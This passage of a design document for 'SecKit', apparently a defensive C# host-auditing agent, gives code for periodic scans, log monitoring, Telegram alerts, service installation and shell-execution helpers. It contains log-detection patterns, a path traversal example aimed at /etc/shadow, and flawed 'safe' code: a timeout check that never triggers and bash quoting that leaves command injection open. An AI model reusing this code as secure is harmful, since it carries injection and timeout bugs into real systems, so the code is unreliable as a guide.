### 7.4 Main Worker — Periodic Scanning + Log Monitoring

```csharp
// SecKitWorker.cs
namespace SecKit.Agent;

public class SecKitWorker : BackgroundService
{
    private readonly ILogger<SecKitWorker> _logger;
    private readonly ScanOrchestrator _orchestrator;
    private readonly ScanScheduler _scheduler;
    private readonly TelegramNotifier _telegram;
    private readonly IConfiguration _config;

    public SecKitWorker(
        ILogger<SecKitWorker> logger,
        ScanOrchestrator orchestrator,
        ScanScheduler scheduler,
        TelegramNotifier telegram,
        IConfiguration config)
    {
        _logger = logger;
        _orchestrator = orchestrator;
        _scheduler = scheduler;
        _telegram = telegram;
        _config = config;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("SecKit Agent starting at: {time}", DateTimeOffset.Now);

        // Send startup notification
        await _telegram.SendAsync("🛡️ SecKit Agent started.\n" +
            $"Host: {Environment.MachineName}\n" +
            $"Version: {GetType().Assembly.GetName().Version}");

        // Schedule recurring scans
        var scanInterval = _config.GetValue<int>("SecKit:ScanIntervalHours", 24);
        var quickScanInterval = _config.GetValue<int>("SecKit:QuickScanIntervalMinutes", 60);

        // Main full scan task
        var fullScanTask = RunPeriodicFullScan(TimeSpan.FromHours(scanInterval), stoppingToken);

        // Quick health check task
        var quickScanTask = RunPeriodicQuickScan(TimeSpan.FromMinutes(quickScanInterval), stoppingToken);

        // Log monitoring task
        var logMonitorTask = MonitorSecurityLogs(stoppingToken);

        await Task.WhenAll(fullScanTask, quickScanTask, logMonitorTask);
    }

    private async Task RunPeriodicFullScan(TimeSpan interval, CancellationToken ct)
    {
        // Run initial scan after a delay to let system settle
        await Task.Delay(TimeSpan.FromMinutes(2), ct);

        while (!ct.IsCancellationRequested)
        {
            try
            {
                _logger.LogInformation("Starting full security scan...");
                await _telegram.SendAsync("🔍 Starting scheduled full scan...");

                var results = await _orchestrator.RunFullScanAsync();

                // Generate and send summary
                var summary = FormatScanSummary(results);
                await _telegram.SendAsync(summary);

                // Save report
                await _orchestrator.SaveReportAsync(results);

                _logger.LogInformation("Full scan completed: {critical} critical, {high} high, {medium} medium",
                    results.CriticalCount, results.HighCount, results.MediumCount);
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Full scan failed");
                await _telegram.SendAsync($"❌ Full scan error: {ex.Message}");
            }

            await Task.Delay(interval, ct);
        }
    }

    private async Task RunPeriodicQuickScan(TimeSpan interval, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var results = await _orchestrator.RunQuickScanAsync();
                if (results.CriticalCount > 0)
                {
                    await _telegram.SendAsync($"🚨 Quick scan found {results.CriticalCount} critical issue(s)!");
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Quick scan failed");
            }

            await Task.Delay(interval, ct);
        }
    }

    private async Task MonitorSecurityLogs(CancellationToken ct)
    {
        var logPaths = new[]
        {
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/secure",
        };

        while (!ct.IsCancellationRequested)
        {
            foreach (var logPath in logPaths)
            {
                if (!File.Exists(logPath)) continue;

                try
                {
                    // Check for suspicious patterns in recent log entries
                    var suspiciousPatterns = new[]
                    {
                        ("Failed password for root", "🔑 Failed root login attempt"),
                        ("authentication failure", "🔑 Authentication failure"),
                        ("sudo:.*COMMAND=", "⚡ Sudo execution"),
                        ("CRON.*CMD", "⏰ Cron job executed"),
                        ("segfault", "💥 Segmentation fault detected"),
                        ("OOM killer", "🆘 Out of memory killer invoked"),
                    };

                    // Read last N lines
                    var lastLines = await ReadLastLinesAsync(logPath, 100);
                    foreach (var (pattern, alert) in suspiciousPatterns)
                    {
                        var matches = System.Text.RegularExpressions.Regex.Matches(
                            lastLines, pattern, System.Text.RegularExpressions.RegexOptions.IgnoreCase);

                        if (matches.Count > 0)
                        {
                            // Rate limit alerts (don't spam)
                            _logger.LogWarning("{alert}: {count} occurrences in {log}",
                                alert, matches.Count, logPath);

                            // Only alert on threshold
                            if (matches.Count >= 3)
                            {
                                await _telegram.SendAsync(
                                    $"{alert}\nSource: {logPath}\nCount: {matches.Count}\n" +
                                    $"Latest: {matches.Last().Value}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogDebug(ex, "Error reading {log}", logPath);
                }
            }

            await Task.Delay(TimeSpan.FromMinutes(5), ct); // Check every 5 minutes
        }
    }

    private async Task<string> ReadLastLinesAsync(string path, int lineCount)
    {
        // Simple tail implementation (for big files, use FileStream with reverse seek)
        var lines = await File.ReadAllLinesAsync(path);
        return string.Join("\n", lines.TakeLast(lineCount));
    }

    private string FormatScanSummary(ScanResults results)
    {
        var sb = new StringBuilder();
        sb.AppendLine("📊 **SecKit Scan Summary**");
        sb.AppendLine($"🕐 {DateTime.Now:yyyy-MM-dd HH:mm}");
        sb.AppendLine($"🔴 Critical: {results.CriticalCount}");
        sb.AppendLine($"🟠 High: {results.HighCount}");
        sb.AppendLine($"🟡 Medium: {results.MediumCount}");
        sb.AppendLine($"🟢 Low: {results.LowCount}");

        if (results.TopFindings.Any())
        {
            sb.AppendLine("\n**Top Findings:**");
            foreach (var f in results.TopFindings.Take(5))
            {
                sb.AppendLine($"• {f}");
            }
        }

        return sb.ToString();
    }
}
```

### 7.5 Scan Orchestrator & Scheduler

```csharp
// ScanOrchestrator.cs
namespace SecKit.Agent;

public class ScanOrchestrator
{
    private readonly SshAuditor _sshAuditor;
    private readonly UserAuditor _userAuditor;
    private readonly ProcessAuditor _processAuditor;
    private readonly CronAuditor _cronAuditor;
    private readonly FilesystemAuditor _fsAuditor;
    private readonly KernelHardeningAuditor _kernelAuditor;
    private readonly ILogger<ScanOrchestrator> _logger;

    public ScanOrchestrator(
        LocalCommandExecutor executor,
        ILogger<ScanOrchestrator> logger)
    {
        _sshAuditor = new SshAuditor(executor);
        _userAuditor = new UserAuditor(executor);
        _processAuditor = new ProcessAuditor(executor);
        _cronAuditor = new CronAuditor(executor);
        _fsAuditor = new FilesystemAuditor(executor);
        _kernelAuditor = new KernelHardeningAuditor(executor);
        _logger = logger;
    }

    public async Task<ScanResults> RunFullScanAsync()
    {
        var results = new ScanResults
        {
            Timestamp = DateTime.UtcNow,
            Hostname = Environment.MachineName,
        };

        // Run all audits in parallel
        var tasks = new List<Task>
        {
            Task.Run(async () => results.Ssh = await _sshAuditor.AuditAsync()),
            Task.Run(async () => results.Users = await _userAuditor.AuditAsync()),
            Task.Run(async () => results.Processes = await _processAuditor.AuditAsync()),
            Task.Run(async () => results.Cron = await _cronAuditor.AuditAsync()),
            Task.Run(async () => results.Filesystem = await _fsAuditor.AuditAsync()),
            Task.Run(async () => results.KernelSettings = await _kernelAuditor.CheckSysctlSettings()),
        };

        await Task.WhenAll(tasks);

        // Compile findings
        results.CompileFindings();

        return results;
    }

    public async Task<ScanResults> RunQuickScanAsync()
    {
        // Quick scan: only most critical checks
        var results = new ScanResults
        {
            Timestamp = DateTime.UtcNow,
            Hostname = Environment.MachineName,
        };

        results.Processes = await _processAuditor.AuditAsync();
        results.Ssh = await _sshAuditor.AuditAsync();
        results.CompileFindings();

        return results;
    }

    public async Task SaveReportAsync(ScanResults results)
    {
        var reportDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "SecKit", "Reports");

        Directory.CreateDirectory(reportDir);

        var filename = $"scan_{results.Hostname}_{results.Timestamp:yyyyMMdd_HHmmss}.json";
        var path = Path.Combine(reportDir, filename);

        var json = System.Text.Json.JsonSerializer.Serialize(results,
            new System.Text.Json.JsonSerializerOptions { WriteIndented = true });

        await File.WriteAllTextAsync(path, json);
        _logger.LogInformation("Report saved: {path}", path);
    }
}

public class ScanScheduler
{
    private readonly IConfiguration _config;

    public ScanScheduler(IConfiguration config) => _config = config;

    public DateTime NextFullScan { get; private set; }
    public DateTime NextQuickScan { get; private set; }

    public bool IsFullScanDue() => DateTime.UtcNow >= NextFullScan;
    public bool IsQuickScanDue() => DateTime.UtcNow >= NextQuickScan;

    public void ScheduleFullScan(int hoursFromNow) =>
        NextFullScan = DateTime.UtcNow.AddHours(hoursFromNow);

    public void ScheduleQuickScan(int minutesFromNow) =>
        NextQuickScan = DateTime.UtcNow.AddMinutes(minutesFromNow);
}

public class ScanResults
{
    public DateTime Timestamp { get; set; }
    public string Hostname { get; set; } = "";
    public SshAuditResult? Ssh { get; set; }
    public UserAuditResult? Users { get; set; }
    public ProcessAuditResult? Processes { get; set; }
    public CronAuditResult? Cron { get; set; }
    public FilesystemAuditResult? Filesystem { get; set; }
    public Dictionary<string, string>? KernelSettings { get; set; }

    public int CriticalCount { get; set; }
    public int HighCount { get; set; }
    public int MediumCount { get; set; }
    public int LowCount { get; set; }
    public List<string> TopFindings { get; set; } = new();

    public void CompileFindings()
    {
        // Tally findings from all modules
        // (Implementation compiles CheckStatus across all results)
    }
}
```

### 7.6 Telegram Notifier

```csharp
// TelegramNotifier.cs
using Telegram.Bot;

namespace SecKit.Agent;

public class TelegramNotifier
{
    private readonly ITelegramBotClient _botClient;
    private readonly string _chatId;
    private readonly ILogger<TelegramNotifier> _logger;
    private readonly HashSet<string> _recentAlerts = new(); // Deduplication
    private DateTime _lastAlertTime = DateTime.MinValue;

    public TelegramNotifier(IConfiguration config, ILogger<TelegramNotifier> logger)
    {
        _logger = logger;
        var token = config["SecKit:TelegramBotToken"] ?? "";
        _chatId = config["SecKit:TelegramChatId"] ?? "";

        if (!string.IsNullOrEmpty(token))
            _botClient = new TelegramBotClient(token);
    }

    public async Task SendAsync(string message)
    {
        if (_botClient == null || _chatId == null)
        {
            _logger.LogWarning("Telegram not configured, skipping: {msg}", message);
            return;
        }

        try
        {
            // Rate limit: max 1 message per 10 seconds (unless critical)
            if (DateTime.UtcNow - _lastAlertTime < TimeSpan.FromSeconds(10))
                return;

            _lastAlertTime = DateTime.UtcNow;
            await _botClient.SendTextMessageAsync(_chatId, message);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Failed to send Telegram message");
        }
    }

    /// <summary>
    /// Send alert with deduplication (same alert won't repeat within 1 hour).
    /// </summary>
    public async Task SendAlertAsync(string alertKey, string message)
    {
        if (_recentAlerts.Contains(alertKey)) return;

        _recentAlerts.Add(alertKey);
        await SendAsync(message);

        // Clear dedup after 1 hour
        _ = Task.Run(async () =>
        {
            await Task.Delay(TimeSpan.FromHours(1));
            _recentAlerts.Remove(alertKey);
        });
    }
}
```

### 7.7 Systemd Service Unit File (Linux)

```ini
# /etc/systemd/system/seckit-agent.service
[Unit]
Description=SecKit Security Agent
Documentation=https://github.com/AnujSCode/SecKit
After=network-online.target
Wants=network-online.target

[Service]
Type=notify
User=openclaw-agent
Group=openclaw-agent
WorkingDirectory=/opt/seckit
ExecStart=/opt/seckit/SecKit.Agent
ExecStop=/bin/kill -SIGTERM $MAINPID
Restart=always
RestartSec=30
StartLimitInterval=5min
StartLimitBurst=4

# Security hardening for the agent itself
NoNewPrivileges=yes
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/var/log/seckit /opt/seckit/reports
ReadOnlyPaths=/etc
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
RestrictNamespaces=yes
LockPersonality=yes
RestrictRealtime=yes
RestrictSUIDSGID=yes
MemoryDenyWriteExecute=yes

# Environment
Environment=DOTNET_ENVIRONMENT=Production
Environment=SECURITY_IS_AWESOME=1

[Install]
WantedBy=multi-user.target
```

**Installation commands:**
```bash
sudo cp seckit-agent.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable seckit-agent
sudo systemctl start seckit-agent
sudo systemctl status seckit-agent
```

### 7.8 Windows Service Installation (sc.exe)

```powershell
# Publish the worker as a single-file executable
dotnet publish -c Release -r win-x64 --self-contained -o ./publish

# Copy to install directory
Copy-Item -Path ./publish/* -Destination "C:\Program Files\SecKit\Agent\" -Recurse

# Create Windows Service using sc.exe
sc.exe create "SecKitAgent" `
    binPath="C:\Program Files\SecKit\Agent\SecKit.Agent.exe" `
    start=auto `
    DisplayName="SecKit Security Agent"

# Or using New-Service (PowerShell)
New-Service -Name "SecKitAgent" `
    -BinaryPathName "C:\Program Files\SecKit\Agent\SecKit.Agent.exe" `
    -DisplayName "SecKit Security Agent" `
    -StartupType Automatic

# Start the service
Start-Service SecKitAgent
```

---

## 8. C# Process Execution Patterns

### 8.1 Safe ProcessStartInfo Patterns

```csharp
using System.Diagnostics;
using System.Text;

namespace SecKit.Core.Execution;

/// <summary>
/// Safe, robust process execution utilities for running shell commands.
/// Handles output capture, timeouts, error handling, and security concerns.
/// </summary>
public static class SafeProcess
{
    /// <summary>
    /// Execute a shell command with full output capture and timeout.
    /// Works on both Linux (bash) and Windows (cmd).
    /// </summary>
    public static async Task<ProcessResult> ExecuteAsync(
        string command,
        string? workingDirectory = null,
        int timeoutSeconds = 30,
        CancellationToken ct = default)
    {
        var psi = new ProcessStartInfo
        {
            FileName = OperatingSystem.IsWindows() ? "cmd.exe" : "/bin/bash",
            Arguments = OperatingSystem.IsWindows()
                ? $"/c \"{command}\""
                : $"-c \"{command.Replace("\"", "\\\"")}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,    // CRITICAL for output capture + security
            CreateNoWindow = true,       // Don't spawn window
            WorkingDirectory = workingDirectory ?? string.Empty,
        };

        // Set safe environment (don't inherit all env vars for sensitive commands)
        // psi.Environment.Clear();
        // psi.Environment["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";

        using var process = new Process { StartInfo = psi };

        var stdout = new StringBuilder();
        var stderr = new StringBuilder();

        process.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) stdout.AppendLine(e.Data);
        };
        process.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) stderr.AppendLine(e.Data);
        };

        try
        {
            if (!process.Start())
            {
                return new ProcessResult(-1, "", "Failed to start process", true);
            }

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            using var timeoutCts = new CancellationTokenSource(
                TimeSpan.FromSeconds(timeoutSeconds));
            using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(
                ct, timeoutCts.Token);

            try
            {
                await process.WaitForExitAsync(linkedCts.Token);
            }
            catch (OperationCanceledException)
            {
                // Kill process tree on timeout
                KillProcessTree(process);
                return new ProcessResult(-1, stdout.ToString(),
                    $"Command timed out after {timeoutSeconds}s", true);
            }

            // Ensure all async output is collected
            process.WaitForExit(); // brief sync wait for buffered output

            return new ProcessResult(
                process.ExitCode,
                stdout.ToString().TrimEnd(),
                stderr.ToString().TrimEnd(),
                process.ExitCode != 0);
        }
        catch (Exception ex)
        {
            if (!process.HasExited)
                KillProcessTree(process);

            return new ProcessResult(-1, stdout.ToString(),
                $"Process error: {ex.Message}", true);
        }
    }

    /// <summary>
    /// Execute a command with combined stdout+stderr (simpler API).
    /// </summary>
    public static async Task<ProcessResult> ExecuteSimpleAsync(
        string command, int timeoutSeconds = 30)
    {
        var psi = new ProcessStartInfo
        {
            FileName = OperatingSystem.IsWindows() ? "cmd.exe" : "/bin/bash",
            Arguments = OperatingSystem.IsWindows()
                ? $"/c \"{command}\""
                : $"-c \"{command.Replace("\"", "\\\"")}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };

        using var process = Process.Start(psi)!;

        var readOutputTask = process.StandardOutput.ReadToEndAsync();
        var readErrorTask = process.StandardError.ReadToEndAsync();

        var completed = await Task.WhenAny(
            process.WaitForExitAsync(),
            Task.Delay(TimeSpan.FromSeconds(timeoutSeconds)));

        if (completed is not Task processTask)
        {
            KillProcessTree(process);
            return new ProcessResult(-1, "", $"Timeout after {timeoutSeconds}s", true);
        }

        var stdout = await readOutputTask;
        var stderr = await readErrorTask;

        return new ProcessResult(
            process.ExitCode,
            stdout.TrimEnd(),
            stderr.TrimEnd(),
            process.ExitCode != 0);
    }

    /// <summary>
    /// Kill a process and all its children (Unix) or just the process (Windows).
    /// </summary>
    private static void KillProcessTree(Process process)
    {
        try
        {
            if (OperatingSystem.IsLinux() || OperatingSystem.IsMacOS())
            {
                // Kill entire process group
                Process.Start(new ProcessStartInfo
                {
                    FileName = "kill",
                    Arguments = $"-TERM -- -{process.Id}",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                })?.WaitForExit(2000);
            }

            if (!process.HasExited)
            {
                process.Kill(entireProcessTree: true);
            }
        }
        catch
        {
            try { process.Kill(); } catch { }
        }
    }
}

public record ProcessResult(
    int ExitCode,
    string Stdout,
    string Stderr,
    bool IsError
)
{
    public bool Success => ExitCode == 0 && !IsError;
    public string AllOutput => $"{Stdout}\n{Stderr}".Trim();

    /// <summary>
    /// Parse stdout as lines, excluding empty ones.
    /// </summary>
    public List<string> OutputLines =>
        Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(l => l.TrimEnd('\r'))
            .ToList();

    /// <summary>
    /// Parse stdout as a single value (first non-empty line).
    /// </summary>
    public string FirstLine =>
        Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .FirstOrDefault()?.TrimEnd('\r') ?? "";

    /// <summary>
    /// Check if output contains a pattern (grep-like).
    /// </summary>
    public bool Contains(string pattern, StringComparison comparison = StringComparison.OrdinalIgnoreCase)
        => Stdout.Contains(pattern, comparison) || Stderr.Contains(pattern, comparison);
}
```

### 8.2 Advanced: Streaming Output for Long-Running Commands

```csharp
/// <summary>
/// Execute a command and stream output line-by-line with cancellation support.
/// Useful for long-running scans where you want real-time feedback.
/// </summary>
public static class StreamingProcess
{
    public static async IAsyncEnumerable<string> ExecuteStreamingAsync(
        string command,
        int timeoutSeconds = 300,
        [System.Runtime.CompilerServices.EnumeratorCancellation] CancellationToken ct = default)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = $"-c \"{command.Replace("\"", "\\\"")}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };

        using var process = new Process { StartInfo = psi };

        // Channel-based output collection
        var outputChannel = System.Threading.Channels.Channel.CreateUnbounded<string>(
            new System.Threading.Channels.UnboundedChannelOptions
            {
                SingleReader = true,
                SingleWriter = false,
            });

        process.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null)
                outputChannel.Writer.TryWrite($"[stdout] {e.Data}");
        };
        process.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null)
                outputChannel.Writer.TryWrite($"[stderr] {e.Data}");
        };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        using var timeoutCts = new CancellationTokenSource(
            TimeSpan.FromSeconds(timeoutSeconds));
        using var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(
            ct, timeoutCts.Token);

        try
        {
            await foreach (var line in outputChannel.Reader.ReadAllAsync(linkedCts.Token))
            {
                yield return line;
            }

            await process.WaitForExitAsync(CancellationToken.None);
            outputChannel.Writer.TryComplete();
        }
        catch (OperationCanceledException)
        {
            try { process.Kill(true); } catch { }
            yield return "[seckit] PROCESS TIMED OUT OR CANCELLED";
        }
    }
}
```

### 8.3 Parsing Command Output (grep/awk-style in C#)

```csharp
/// <summary>
/// Lightweight text processing utilities — grep/awk/sed equivalents in C#.
/// </summary>
public static class TextProcessing
{
    /// <summary>
    /// Grep: filter lines matching a regex pattern.
    /// </summary>
    public static List<string> Grep(string input, string pattern, bool ignoreCase = true)
    {
        var regex = new System.Text.RegularExpressions.Regex(
            pattern,
            ignoreCase
                ? System.Text.RegularExpressions.RegexOptions.IgnoreCase
                : System.Text.RegularExpressions.RegexOptions.None);

        return input.Split('\n')
            .Where(line => regex.IsMatch(line))
            .Select(l => l.TrimEnd('\r'))
            .ToList();
    }

    /// <summary>
    /// Grep with inverted match (grep -v).
    /// </summary>
    public static List<string> GrepInverse(string input, string pattern, bool ignoreCase = true)
    {
        var regex = new System.Text.RegularExpressions.Regex(pattern,
            ignoreCase
                ? System.Text.RegularExpressions.RegexOptions.IgnoreCase
                : System.Text.RegularExpressions.RegexOptions.None);

        return input.Split('\n')
            .Where(line => !regex.IsMatch(line) && !string.IsNullOrWhiteSpace(line))
            .Select(l => l.TrimEnd('\r'))
            .ToList();
    }

    /// <summary>
    /// Awk: split lines by delimiter and extract column.
    /// </summary>
    public static List<string> Awk(string input, int column, char delimiter = ' ',
        StringSplitOptions options = StringSplitOptions.RemoveEmptyEntries)
    {
        return input.Split('\n')
            .Where(line => !string.IsNullOrWhiteSpace(line))
            .Select(line =>
            {
                var parts = line.Split(delimiter, options);
                return column > 0
                    ? (parts.Length >= column ? parts[column - 1] : "")
                    : parts[parts.Length + column]; // negative index from end
            })
            .Where(v => !string.IsNullOrWhiteSpace(v))
            .ToList();
    }

    /// <summary>
    /// Parse key=value or key:value pairs from output.
    /// </summary>
    public static Dictionary<string, string> ParseKeyValue(
        string input, char separator = '=')
    {
        var dict = new Dictionary<string, string>();
        foreach (var line in input.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            var idx = line.IndexOf(separator);
            if (idx > 0)
            {
                var key = line[..idx].Trim();
                var value = line[(idx + 1)..].Trim();
                dict[key] = value;
            }
        }
        return dict;
    }

    /// <summary>
    /// Parse structured table output (like `ps aux`, `ls -la`, `ss -tlnp`).
    /// Returns list of string arrays, one per line, split by whitespace.
    /// </summary>
    public static List<string[]> ParseTable(string input, int? expectedColumns = null)
    {
        return input.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(line =>
                line.Split(' ', StringSplitOptions.RemoveEmptyEntries))
            .Where(cols => !expectedColumns.HasValue || cols.Length >= expectedColumns.Value)
            .ToList();
    }

    /// <summary>
    /// Extract value using a regex capture group.
    /// Example: input="uid=1000 gid=1000", pattern="uid=(\d+)" → "1000"
    /// </summary>
    public static string? ExtractValue(string input, string pattern, int group = 1)
    {
        var match = System.Text.RegularExpressions.Regex.Match(input, pattern);
        return match.Success ? match.Groups[group].Value : null;
    }

    /// <summary>
    /// Head: get first N lines.
    /// </summary>
    public static List<string> Head(string input, int count = 10)
        => input.Split('\n').Take(count).Select(l => l.TrimEnd('\r')).ToList();

    /// <summary>
    /// Tail: get last N lines.
    /// </summary>
    public static List<string> Tail(string input, int count = 10)
    {
        var lines = input.Split('\n').Select(l => l.TrimEnd('\r')).ToArray();
        return lines.Skip(Math.Max(0, lines.Length - count)).ToList();
    }
}
```

### 8.4 Security Considerations for Running Privileged Commands

```csharp
/// <summary>
/// Security wrapper for privileged command execution.
/// </summary>
public static class PrivilegedCommandSecurity
{
    /// <summary>
    /// Sanitize command input to prevent injection.
    /// NEVER concatenate user input directly into shell commands.
    /// </summary>
    public static string SanitizeForShell(string input)
    {
        if (string.IsNullOrEmpty(input)) return "";

        // Allow only alphanumeric, hyphens, underscores, dots, slashes, colons
        var safe = System.Text.RegularExpressions.Regex.Replace(input,
            @"[^a-zA-Z0-9\-_./:@]", "");

        if (safe != input)
        {
            throw new SecurityException(
                $"Potentially dangerous characters in command argument. " +
                $"Original: '{input}', Sanitized: '{safe}'");
        }

        return safe;
    }

    /// <summary>
    /// Validate that a file path is within allowed directories.
    /// Prevents path traversal attacks like ../../../etc/shadow.
    /// </summary>
    public static string ValidatePath(string path, string[] allowedDirectories)
    {
        var fullPath = Path.GetFullPath(path);

        foreach (var allowed in allowedDirectories)
        {
            var allowedFull = Path.GetFullPath(allowed);
            if (fullPath.StartsWith(allowedFull + Path.DirectorySeparatorChar) ||
                fullPath == allowedFull)
            {
                return fullPath;
            }
        }

        throw new SecurityException(
            $"Path '{path}' resolves outside allowed directories: " +
            $"{string.Join(", ", allowedDirectories)}");
    }

    /// <summary>
    /// Log all privileged commands.
    /// </summary>
    public static void LogPrivilegedCommand(string command, string user)
    {
        var logEntry = $"[{DateTime.UtcNow:O}] User={user} Command={command}";
        // Append to secure log
        File.AppendAllText("/var/log/seckit/privileged-commands.log", logEntry + Environment.NewLine);
    }

    /// <summary>
    /// Check if sudo is available and we have passwordless sudo for
    /// the required commands.
    /// </summary>
    public static async Task<bool> CheckSudoAccessAsync(params string[] requiredCommands)
    {
        foreach (var cmd in requiredCommands)
        {
            var result = await SafeProcess.ExecuteAsync(
                $"sudo -n {cmd} --version 2>/dev/null || echo 'NO_SUDO'");
            if (result.Stdout.Contains("NO_SUDO"))
                return false;
        }
        return true;
    }

    /// <summary>
    /// Read secrets from a secure source (env var → file → vault).
    /// Never hardcode credentials.
    /// </summary>
    public static string GetSecureConfig(string key)
    {
        // Try environment variable
        var env = Environment.GetEnvironmentVariable($"SECKIT_{key.ToUpper()}");
        if (!string.IsNullOrEmpty(env))
            return env;

        // Try Docker secret (if running in container)
        var secretPath = $"/run/secrets/seckit_{key.ToLower()}";
        if (File.Exists(secretPath))
            return File.ReadAllText(secretPath).Trim();

        // Try config file with restricted permissions
        var configPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "SecKit", "secrets.conf");

        if (File.Exists(configPath))
        {
            var lines = File.ReadAllLines(configPath);
            foreach (var line in lines)
            {
                var parts = line.Split('=', 2);
                if (parts.Length == 2 && parts[0].Trim() == key)
                    return parts[1].Trim();
            }
        }

        throw new InvalidOperationException(
            $"Secret '{key}' not found. Set SECKIT_{key.ToUpper()} env var, " +
            $"create /run/secrets/seckit_{key.ToLower()}, or add to {configPath}");
    }
}

public class SecurityException : Exception
{
    public SecurityException(string message) : base(message) { }
    public SecurityException(string message, Exception inner) : base(message, inner) { }
}
```

### 8.5 Process Pool for Parallel Execution

```csharp
/// <summary>
/// Run multiple commands in parallel with concurrency limit.
/// Useful for auditing multiple servers or directories simultaneously.
/// </summary>
public class ProcessPool
{
    private readonly SemaphoreSlim _semaphore;
    private readonly int _timeoutSeconds;

    public ProcessPool(int maxConcurrency = 4, int timeoutSeconds = 60)
    {
        _semaphore = new SemaphoreSlim(maxConcurrency);
        _timeoutSeconds = timeoutSeconds;
    }

    public async Task<List<ProcessResult>> ExecuteAllAsync(
        IEnumerable<string> commands,
        CancellationToken ct = default)
    {
        var tasks = commands.Select(cmd => ExecuteOneAsync(cmd, ct));
        var results = await Task.WhenAll(tasks);
        return results.ToList();
    }

    private async Task<ProcessResult> ExecuteOneAsync(string command, CancellationToken ct)
    {
        await _semaphore.WaitAsync(ct);
        try
        {
            return await SafeProcess.ExecuteAsync(command, timeoutSeconds: _timeoutSeconds, ct: ct);
        }
        finally
        {
            _semaphore.Release();
        }
    }
}

// Usage:
// var pool = new ProcessPool(maxConcurrency: 8);
// var commands = servers.Select(s => $"ssh {s} 'uptime'");
// var results = await pool.ExecuteAllAsync(commands);
```

### 8.6 Complete Result Aggregation Pipeline

```csharp
/// <summary>
/// Pipeline: Execute → Parse → Filter → Transform → Export
/// Common pattern for chaining audit checks.
/// </summary>
public static class AuditPipeline
{
    /// <summary>
    /// Full pipeline for a typical audit check.
    /// </summary>
    public static async Task<List<T>> RunAsync<T>(
        string command,
        Func<string, List<string>> filter,
        Func<List<string>, List<T>> transform,
        int timeoutSeconds = 30)
    {
        // 1. Execute
        var result = await SafeProcess.ExecuteAsync(command, timeoutSeconds: timeoutSeconds);

        if (result.IsError && !string.IsNullOrEmpty(result.Stderr))
        {
            // Log error but continue — some commands write to stderr normally
            Console.Error.WriteLine($"Command warning: {result.Stderr}");
        }

        // 2. Filter (grep-like)
        var filtered = filter(result.Stdout);

        // 3. Transform (parse into objects)
        var transformed = transform(filtered);

        return transformed;
    }

    // Example: Parse listening ports
    public static async Task<List<PortInfo>> GetListeningPortsAsync()
    {
        return await RunAsync(
            command: "ss -tlnp 2>/dev/null | tail -n +2",
            filter: output => output.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList(),
            transform: lines =>
            {
                return lines.Select(line =>
                {
                    var parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);
                    return parts.Length >= 5
                        ? new PortInfo(parts[0], parts[4].Split(':')[0],
                            parts[4].Split(':').Last(), "", "")
                        : new PortInfo("", "", "", "", "");
                }).ToList();
            });
    }
}
```

---

## Appendix A: Recommended NuGet Package Summary

| Package | Version | Purpose |
|---------|---------|---------|
| `SSH.NET` | 2024.2+ | Remote SSH command execution |
| `Docker.DotNet` | 3.125+ | Docker daemon API client |
| `AWSSDK.S3` | 3.7.* | S3 bucket audit |
| `AWSSDK.IdentityManagement` | 3.7.* | IAM user/role audit |
| `AWSSDK.EC2` | 3.7.* | Security group audit |
| `AWSSDK.SecurityHub` | 3.7.* | AWS Security Hub integration |
| `Azure.Identity` | 1.12+ | Azure authentication |
| `Azure.ResourceManager` | 1.12+ | Azure resource management |
| `Google.Cloud.Storage.V1` | 4.10+ | GCS storage |
| `System.IdentityModel.Tokens.Jwt` | 8.1+ | JWT parsing & testing |
| `Microsoft.IdentityModel.Tokens` | 8.1+ | JWT signing & validation |
| `Telegram.Bot` | 19.0+ | Telegram notifications |
| `Microsoft.Extensions.Hosting` | 8.0.* | Worker service hosting |
| `Microsoft.Extensions.Hosting.Systemd` | 8.0.* | Systemd integration |
| `Microsoft.Extensions.Hosting.WindowsServices` | 8.0.* | Windows Service integration |

## Appendix B: Solution Structure Recommendation

```
SecKit/
├── SecKit.sln
├── src/
│   ├── SecKit.Core/              # All audit logic, models, interfaces
│   │   ├── Hardening/
│   │   ├── Docker/
│   │   ├── Cloud/
│   │   │   ├── Aws/
│   │   │   ├── Azure/
│   │   │   └── Gcp/
│   │   ├── JwtTesting/
│   │   ├── WafRules/
│   │   └── Execution/
│   ├── SecKit.Agent/             # Background service (Worker Service)
│   ├── SecKit.Dashboard/         # Blazor Server web UI
│   └── SecKit.Cli/               # Command-line tool (optional)
